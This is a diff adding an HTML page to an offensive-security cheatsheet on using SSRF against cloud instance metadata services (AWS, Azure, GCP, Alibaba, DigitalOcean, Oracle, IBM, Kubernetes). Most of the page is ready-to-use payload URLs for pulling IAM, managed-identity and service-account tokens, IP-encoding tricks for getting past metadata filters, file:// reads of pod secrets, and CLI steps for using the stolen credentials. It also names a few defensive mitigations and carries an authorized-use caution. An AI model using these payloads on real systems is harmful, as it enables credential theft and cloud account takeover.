@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cloud metadata · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Cloud metadata</h1><p class="cx-lede">Reaching cloud instance metadata services through SSRF - AWS IMDS, Azure IMDS, GCP, Alibaba, DigitalOcean, Oracle, Kubernetes.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1552.005</span><span class="cx-tag">D3FEND D3-NI, D3-OTF, D3-CE</span><span class="cx-tag">IMPACT CloudMetadata, CredentialTheft</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Cloud-hosted apps run alongside an instance metadata service that's reachable only from the instance itself - including via SSRF. The metadata service exposes IAM credentials, network info, user-data scripts, and configuration. One SSRF on a cloud-hosted target frequently turns into full cloud account compromise.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># AWS (IMDSv1 - disable if hardened, but most legacy)
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Azure
+?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header required: Metadata: true
+
+# GCP
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Header required: Metadata-Flavor: Google</code></pre></figure>
+<p>Success indicator: JSON or text response containing IAM/identity tokens, instance metadata, or user-data scripts.</p>
+<h2 id="why-this-matters">Why this matters</h2>
+<p>The metadata service is the most consequential SSRF target on a cloud host. Reaching it means:</p>
+<ul>
+<li><strong>AWS</strong> → IAM role credentials → S3, EC2, Lambda, RDS, anything the role can do</li>
+<li><strong>Azure</strong> → managed identity tokens → resource access scoped to the identity</li>
+<li><strong>GCP</strong> → service account tokens → access to whatever Google APIs the SA has</li>
+<li><strong>Kubernetes</strong> → service account tokens → API server access scoped to the pod's role</li>
+</ul>
+<p>A modest read-only IAM role still reads S3 buckets. A typical app role reads/writes its own resources. An over-privileged role (common in legacy deployments) is account takeover.</p>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Cloud metadata exfiltration is high-impact and high-noise. CloudTrail/Activity Log records every API call made with stolen credentials. If you're operating with permission, document carefully - both for the report and to prove which actions were yours during incident response. If you're not authorized, this is account compromise.</p>
+</div>
+<h2 id="aws-instance-metadata-service">AWS - Instance Metadata Service</h2>
+<h3 id="imdsv1-legacy-no-auth">IMDSv1 (legacy, no auth)</h3>
+<p>Reachable from any process on the instance with a simple GET request. Most exposed systems still allow IMDSv1.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Discover the IAM role attached to the instance
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Returns: &lt;RoleName&gt;
+
+# Fetch credentials for that role
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;RoleName&gt;
+# Returns JSON:
+# {
+#   &quot;AccessKeyId&quot;: &quot;ASIA...&quot;,
+#   &quot;SecretAccessKey&quot;: &quot;...&quot;,
+#   &quot;Token&quot;: &quot;...&quot;,
+#   &quot;Expiration&quot;: &quot;...&quot;
+# }</code></pre></figure>
+<p>The credentials are temporary (typically ~6 hours) but full-strength while valid. Use them with the AWS CLI:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">export AWS_ACCESS_KEY_ID=&quot;ASIA...&quot;
+export AWS_SECRET_ACCESS_KEY=&quot;...&quot;
+export AWS_SESSION_TOKEN=&quot;...&quot;
+aws sts get-caller-identity
+aws s3 ls</code></pre></figure>
+<h3 id="other-useful-imds-endpoints">Other useful IMDS endpoints</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># User data (often contains bootstrap scripts with secrets)
+?url=http://169.254.169.254/latest/user-data/
+
+# Instance identity
+?url=http://169.254.169.254/latest/meta-data/instance-id
+?url=http://169.254.169.254/latest/meta-data/hostname
+?url=http://169.254.169.254/latest/meta-data/public-hostname
+?url=http://169.254.169.254/latest/meta-data/local-hostname
+
+# Network
+?url=http://169.254.169.254/latest/meta-data/local-ipv4
+?url=http://169.254.169.254/latest/meta-data/public-ipv4
+?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+
+# Security groups
+?url=http://169.254.169.254/latest/meta-data/security-groups
+
+# Region (useful for AWS CLI region setting)
+?url=http://169.254.169.254/latest/meta-data/placement/region</code></pre></figure>
+<p>The full tree:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=http://169.254.169.254/latest/meta-data/
+# Returns top-level keys; recurse from there</code></pre></figure>
+<h3 id="imdsv2-token-based-harder">IMDSv2 (token-based, harder)</h3>
+<p>IMDSv2 requires a <code>PUT</code> request to get a session token first, then <code>GET</code> with the token in a header. Two roadblocks for SSRF:</p>
+<ol>
+<li><strong>PUT method</strong> - most SSRF wrappers only do GET</li>
+<li><strong>Custom header</strong> - <code>X-aws-ec2-metadata-token-ttl-seconds</code></li>
+</ol>
+<p>If the SSRF can do PUT and add headers, IMDSv2 still works:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Step 1: get token
+?url=http://169.254.169.254/latest/api/token
+# (PUT, with header X-aws-ec2-metadata-token-ttl-seconds: 21600)
+
+# Step 2: use token
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# (with header X-aws-ec2-metadata-token: &lt;TOKEN&gt;)</code></pre></figure>
+<p>When the SSRF is GET-only, IMDSv2 is generally not exploitable. Some applications proxy headers from the original request, in which case adding <code>X-aws-ec2-metadata-token: &lt;token&gt;</code> to your <em>outer</em> request gets it forwarded. Test before assuming.</p>
+<h3 id="imdsv2-confused-deputy">IMDSv2 confused-deputy</h3>
+<p>Some apps proxy specific headers but not method:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Application takes a &quot;method&quot; parameter
+?url=http://169.254.169.254/latest/api/token&amp;method=PUT&amp;header=X-aws-ec2-metadata-token-ttl-seconds:21600</code></pre></figure>
+<p>Look at the SSRF parameter's full surface - many implementations accept <code>headers[]</code>, <code>method</code>, <code>body</code> as additional parameters that get passed through.</p>
+<h2 id="azure-instance-metadata-service">Azure - Instance Metadata Service</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Same IP as AWS, different paths
+?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header required: Metadata: true
+
+# Managed identity tokens
+?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fmanagement.azure.com
+# Header required: Metadata: true
+# Returns: { &quot;access_token&quot;: &quot;...&quot;, &quot;expires_in&quot;: &quot;...&quot;, &quot;resource&quot;: &quot;https://management.azure.com&quot; }</code></pre></figure>
+<p>The <code>Metadata: true</code> header is mandatory. Without it, Azure returns 400. SSRFs that can't add custom headers don't work against Azure metadata.</p>
+<p>Use the token:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">TOKEN=&quot;&lt;access_token&gt;&quot;
+curl -H &quot;Authorization: Bearer $TOKEN&quot; \
+     &quot;https://management.azure.com/subscriptions?api-version=2020-01-01&quot;</code></pre></figure>
+<h3 id="azure-resource-targets">Azure resource targets</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Different resource = different scope
+&amp;resource=https%3A%2F%2Fvault.azure.net          # Key Vault
+&amp;resource=https%3A%2F%2Fstorage.azure.com         # Storage
+&amp;resource=https%3A%2F%2Fgraph.microsoft.com       # Microsoft Graph</code></pre></figure>
+<p>Request tokens for the resource you want to access. The managed identity may have different permissions per resource.</p>
+<h2 id="gcp-metadata-server">GCP - Metadata Server</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Different domain, header required
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Header required: Metadata-Flavor: Google
+
+# Returns:
+# {
+#   &quot;access_token&quot;: &quot;ya29...&quot;,
+#   &quot;expires_in&quot;: 3599,
+#   &quot;token_type&quot;: &quot;Bearer&quot;
+# }</code></pre></figure>
+<p>Without the <code>Metadata-Flavor: Google</code> header, GCP returns 403. Same problem as Azure - SSRFs without custom headers can't reach it.</p>
+<h3 id="useful-gcp-endpoints">Useful GCP endpoints</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Service account email (which identity am I?)
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+
+# Scopes (what can this token access?)
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+
+# Project info
+?url=http://metadata.google.internal/computeMetadata/v1/project/project-id
+?url=http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
+
+# Custom metadata (often contains startup scripts)
+?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
+
+# Recursive dump
+?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=json</code></pre></figure>
+<p>The recursive dump is the fastest way to understand what's available in one request.</p>
+<h3 id="gcp-ip-alternative">GCP IP alternative</h3>
+<p><code>metadata.google.internal</code> resolves to <code>169.254.169.254</code>. If the filter blocks domain names but allows IPs, use the IP directly - same paths.</p>
+<h2 id="other-clouds">Other clouds</h2>
+<h3 id="alibaba-cloud">Alibaba Cloud</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=http://100.100.100.200/latest/meta-data/                          # tree
+?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/&lt;RoleName&gt;</code></pre></figure>
+<p>Different IP (<code>100.100.100.200</code>), no header required.</p>
+<h3 id="digitalocean">DigitalOcean</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=http://169.254.169.254/metadata/v1/                               # tree
+?url=http://169.254.169.254/metadata/v1.json                           # all metadata as JSON
+?url=http://169.254.169.254/metadata/v1/user-data                       # user data</code></pre></figure>
+<p>No tokens (DigitalOcean doesn't have IAM equivalent). Useful for SSH keys and user-data scripts.</p>
+<h3 id="oracle-cloud-oci">Oracle Cloud (OCI)</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=http://169.254.169.254/opc/v2/instance/                            # v2 (token-based)
+?url=http://169.254.169.254/opc/v1/instance/                            # v1 (legacy)</code></pre></figure>
+<p>v2 requires <code>Authorization: Bearer Oracle</code> header.</p>
+<h3 id="ibm-cloud">IBM Cloud</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">?url=http://169.254.169.254/metadata/v1/instance?version=2022-03-29
+# Header required: Authorization: Bearer &lt;token from PUT to /instance_identity/v1/token&gt;</code></pre></figure>
+<p>Token-based like AWS IMDSv2.</p>
+<h2 id="kubernetes">Kubernetes</h2>
+<p>When the SSRF runs in a pod, the pod has a service account token mounted:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Read the token via file:// schema (if available)
+?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
+
+# CA cert
+?url=file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Namespace
+?url=file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# API server reachable from pod
+?url=https://kubernetes.default.svc/api/v1/namespaces
+# Header required: Authorization: Bearer &lt;token&gt;</code></pre></figure>
+<p>Use the token directly with <code>kubectl</code>:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">TOKEN=&quot;&lt;extracted token&gt;&quot;
+kubectl --server=https://&lt;api-server&gt; --token=$TOKEN --insecure-skip-tls-verify get pods --all-namespaces</code></pre></figure>
+<p>A service account with <code>cluster-admin</code> (more common than it should be) is full cluster takeover. Even a namespace-scoped SA frequently has enough permissions to read secrets.</p>
+<h2 id="ip-encoding-bypass-for-metadata">IP encoding bypass for metadata</h2>
+<p>When <code>169.254.169.254</code> is filtered:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?url=http://2852039166/latest/meta-data/                    # decimal
+?url=http://0xa9fea9fe/latest/meta-data/                    # hex
+?url=http://0251.0376.0251.0376/latest/meta-data/           # octal
+?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/            # IPv6-mapped
+?url=http://169.254.169.254.nip.io/latest/meta-data/        # DNS
+?url=http://metadata.google.internal/...                    # GCP-only domain alias</code></pre></figure>
+<p>See <a href="../filter-bypass/index.html">filter bypass</a> for the broader catalog.</p>
+<h2 id="validating-credentials">Validating credentials</h2>
+<p>Before celebrating, make sure the credentials work:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">AWS</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">export AWS_ACCESS_KEY_ID=&quot;ASIA...&quot;
+export AWS_SECRET_ACCESS_KEY=&quot;...&quot;
+export AWS_SESSION_TOKEN=&quot;...&quot;
+
+aws sts get-caller-identity                     # confirm identity
+aws iam list-attached-role-policies --role-name &lt;RoleName&gt;  # what can it do
+aws s3 ls                                       # try the easy targets</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Azure</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">TOKEN=&quot;&lt;access_token&gt;&quot;
+curl -H &quot;Authorization: Bearer $TOKEN&quot; &quot;https://management.azure.com/subscriptions?api-version=2020-01-01&quot;
+curl -H &quot;Authorization: Bearer $TOKEN&quot; &quot;https://management.azure.com/tenants?api-version=2020-01-01&quot;</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">GCP</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">TOKEN=&quot;ya29...&quot;
+curl -H &quot;Authorization: Bearer $TOKEN&quot; &quot;https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN&quot;
+curl -H &quot;Authorization: Bearer $TOKEN&quot; &quot;https://cloudresourcemanager.googleapis.com/v1/projects&quot;</code></pre></figure>
+</div>
+</div>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>AWS metadata returns nothing.</strong> IMDSv2-only mode enforced (instance launched with <code>HttpTokens=required</code>). If the SSRF can't do PUT or set headers, AWS metadata is out of reach. Pivot to other internal services.</li>
+<li><strong>Azure/GCP returns 400/403.</strong> Required header (<code>Metadata: true</code>, <code>Metadata-Flavor: Google</code>) not being sent. Check whether the SSRF parameter accepts custom headers (some apps pass through <code>headers[]</code> arrays).</li>
+<li><strong>Credentials work via <code>aws</code> CLI but every command fails with AccessDenied.</strong> Role has minimal permissions - common for stripped-down app roles. Try the obvious resources (S3 buckets named after the company, the instance's own region resources). If everything is denied, the role really is just "describe self" and the chain stops here.</li>
+<li><strong>Token expires mid-exploitation.</strong> AWS tokens last ~6 hours, Azure ~24 hours, GCP ~1 hour. Re-fetch periodically. For long operations, dump the role policy first and plan the action set.</li>
+<li><strong>Metadata reachable but kubectl fails with TLS errors.</strong> Pod's CA cert isn't system-trusted. Use <code>--insecure-skip-tls-verify</code> or pass <code>--certificate-authority=&lt;path-to-ca.crt&gt;</code> from the file you exfiltrated.</li>
+<li><strong><code>metadata.google.internal</code> doesn't resolve.</strong> App resolves DNS through a non-default resolver that doesn't know the metadata domain. Use the IP <code>169.254.169.254</code> directly.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>The single best habit on a cloud-hosted SSRF: try metadata first, before anything else. The payoff is enormous and the probe is one request. If it works, you're done with the section's first half - the rest of the engagement becomes "what does this IAM role have access to."</p>
+<p>The defender's mitigation is straightforward (IMDSv2-only on AWS, network policies on K8s, header requirements on Azure/GCP) but adoption is slow. Most engagements still land on legacy IMDSv1 or unhardened pod tokens.</p></article><nav class="cx-pager"><a class="cx-prev" href="../../ssti/twig/index.html">Previous: Twig (PHP - Symfony, Craft, Drupal 8+)</a><a class="cx-next" href="../../ssti/freemarker/index.html">Next: Freemarker (Java - Confluence, Spring)</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
